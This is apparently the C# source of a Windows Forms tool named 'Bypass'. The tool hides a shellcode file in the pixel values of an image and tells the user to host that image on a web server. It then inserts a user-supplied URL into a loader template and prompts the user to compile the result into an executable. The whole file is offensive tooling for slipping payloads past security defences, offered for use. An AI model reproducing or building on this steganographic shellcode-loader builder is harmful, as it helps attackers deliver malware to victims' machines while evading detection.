using Bypass.Properties;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace Bypass
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog FOpen = new OpenFileDialog()
            {
                Filter = "Shellcode|*.bin",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (FOpen.ShowDialog() == DialogResult.OK)
                textBox1.Text = FOpen.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string filePath = textBox1.Text;
            Bitmap img = pixelate(filePath);
            SaveFileDialog s = new SaveFileDialog();
            s.DefaultExt = "bmp";
            s.Filter = "PNG Files|*.png";
            if (s.ShowDialog() == DialogResult.OK)
            {
                img.Save(s.FileName);
                MessageBox.Show("将文件存放到web服务器","Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        public static Bitmap pixelate(string filePath)
        {
            string a = Convert.ToBase64String(System.IO.File.ReadAllBytes(filePath));
            char[] aR = a.ToCharArray();
            double sq = Math.Sqrt(aR.Length);
            int autosize = ((int)sq) + 2;
            Bitmap imageholder = new Bitmap(autosize, autosize);
            int fff = 0;
            for (int y = 1; y <= imageholder.Height - 1; y++)
            {
                for (int x = 1; x <= imageholder.Width - 1; x++)
                {
                    if (fff <= aR.Length - 1)
                    {
                        int charCode = aR[fff];
                        imageholder.SetPixel(x, y, Color.FromArgb(charCode, 0, 0));
                        fff++;
                    }
                }
            }
            return imageholder;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string Source = Resources.imgcrypt;
            if (textBox2.Text != "")
            {
                Source = Source.Replace("%qwq%", textBox2.Text);
                richTextBox1.Text = Source;
                MessageBox.Show("复制到 VS ; 选择 .NET Framework 4.0 ; 生成exe文件","Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("请输入URL.",
                        "Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}
